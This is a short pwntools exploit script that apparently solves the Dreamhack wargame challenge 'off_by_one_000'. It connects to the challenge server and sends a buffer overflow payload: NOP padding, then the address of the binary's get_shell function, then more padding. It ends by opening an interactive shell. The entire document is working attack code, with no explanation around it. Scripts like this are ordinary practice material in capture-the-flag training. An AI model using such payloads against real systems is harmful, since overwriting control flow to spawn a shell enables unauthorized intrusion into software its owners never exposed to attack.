from pwn import *

p = remote("host1.dreamhack.games", 23258)
elf = ELF("./off_by_one_000")

get_shell = elf.symbols['get_shell']

payload = "\x90"*32
payload += p32(get_shell)
payload += "\x90"*500

p.recvuntil("Name: ")
p.send(payload)

p.interactive()